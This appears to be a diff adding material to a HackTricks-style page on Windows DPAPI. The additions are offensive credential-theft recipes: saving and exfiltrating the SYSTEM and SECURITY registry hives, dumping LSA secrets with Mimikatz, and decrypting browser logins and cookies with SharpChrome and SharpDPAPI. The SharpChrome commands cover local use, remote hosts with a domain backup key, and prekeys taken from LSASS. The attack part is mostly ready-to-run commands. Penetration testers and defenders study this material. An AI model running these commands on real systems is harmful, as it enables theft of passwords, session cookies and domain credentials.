@@ -55,7 +55,19 @@ Note that these keys **don't have a domain backup** so they are only accesisble 
 
 - **Mimikatz** can access it dumping LSA secrets using the command: `mimikatz lsadump::secrets`
 - The secret is stored inside the registry, so an administrator could **modify the DACL permissions to access it**. The registry path is: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
+- Offline extraction from registry hives is also possible. For example, as an administrator on the target, save the hives and exfiltrate them:
 
+```cmd
+reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
+reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
+```
+
+Then on your analysis box, recover the DPAPI_SYSTEM LSA secret from the hives and use it to decrypt machine-scope blobs (scheduled task passwords, service credentials, Wi‑Fi profiles, etc.):
+
+```text
+mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.hiv
+# Look for the DPAPI_SYSTEM secret in the output
+```
 
 ### Protected Data by DPAPI
 
@@ -171,6 +183,42 @@ search /type:base64 [/base:<base64 string>]
 
 Note that [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (from the same repo) can be used to decrypt using DPAPI sensitive data like cookies.
 
+#### Chromium/Edge/Electron quick recipes (SharpChrome)
+
+- Current user, interactive decryption of saved logins/cookies (works even with Chrome 127+ app-bound cookies because the extra key is resolved from the user’s Credential Manager when running in user context):
+
+```cmd
+SharpChrome logins  /browser:edge  /unprotect
+SharpChrome cookies /browser:chrome /format:csv /unprotect
+```
+
+- Offline analysis when you only have files. First extract the AES state key from the profile’s "Local State" and then use it to decrypt the cookie DB:
+
+```cmd
+# Dump the AES state key from Local State (DPAPI will be used if running as the user)
+SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
+# Copy the hex state key value (e.g., "48F5...AB") and pass it to cookies
+SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
+```
+
+- Domain-wide/remote triage when you have the DPAPI domain backup key (PVK) and admin on the target host:
+
+```cmd
+SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
+SharpChrome logins  /server:HOST01 /browser:chrome /pvk:key.pvk
+```
+
+- If you have a user’s DPAPI prekey/credkey (from LSASS), you can skip password cracking and directly decrypt profile data:
+
+```cmd
+# For SharpChrome use /prekey; for SharpDPAPI use /credkey
+SharpChrome cookies /browser:edge /prekey:SHA1_HEX
+SharpDPAPI.exe credentials /credkey:SHA1_HEX
+```
+
+Notes
+- Newer Chrome/Edge builds may store certain cookies using "App-Bound" encryption. Offline decryption of those specific cookies is not possible without the additional app-bound key; run SharpChrome under the target user context to retrieve it automatically. See the Chrome security blog post referenced below.
+
 ### Access keys and data
 
 - **Use SharpDPAPI** to get credentials from DPAPI encrypted files from the current session:
@@ -251,6 +299,19 @@ Targeting:
                         Note: must use with /pvk:KEY or /password:X
                         Note: not applicable to 'blob' or 'ps' commands
 ```
+
+- Using a DPAPI prekey/credkey directly (no password needed)
+
+If you can dump LSASS, Mimikatz often exposes a per-logon DPAPI key that can be used to decrypt the user’s masterkeys without knowing the plaintext password. Pass this value directly to the tooling:
+
+```cmd
+# SharpDPAPI accepts the "credkey" (domain or local SHA1)
+SharpDPAPI.exe triage /credkey:SHA1_HEX
+
+# SharpChrome accepts the same value as a "prekey"
+SharpChrome logins /browser:edge /prekey:SHA1_HEX
+```
+
 
 - Decrypt some data using **current user session**:
 
@@ -434,5 +495,6 @@ Decryption yields the complete JSON configuration, including every **device post
 - [https://pypi.org/project/donpapi/2.0.0/](https://pypi.org/project/donpapi/2.0.0/)
 - [Impacket – dpapi.py](https://github.com/fortra/impacket)
 - [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, and DPAPI decryption to DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
+- [GhostPack SharpDPAPI/SharpChrome – Usage and options](https://github.com/GhostPack/SharpDPAPI)
 
 {{#include ../../banners/hacktricks-training.md}}
